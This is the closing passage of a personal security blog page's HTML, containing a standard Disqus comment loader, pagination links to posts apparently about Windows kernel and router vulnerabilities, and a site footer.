  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();</script><script id="dsq-count-scr" src="//#{theme.disqus}.disqus.com/count.js" async></script></section><div class="pagination"><a class="pagination__link pagination__prev" href="/2024/01/25/win-hevd-exp-stackoverflow-I/">prev_post</a><a class="pagination__link pagination__next" href="/2024/01/12/MW300R-vuln/">next_post</a></div></main><footer class="footer metadata"><p class="footer__text">© 2024 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>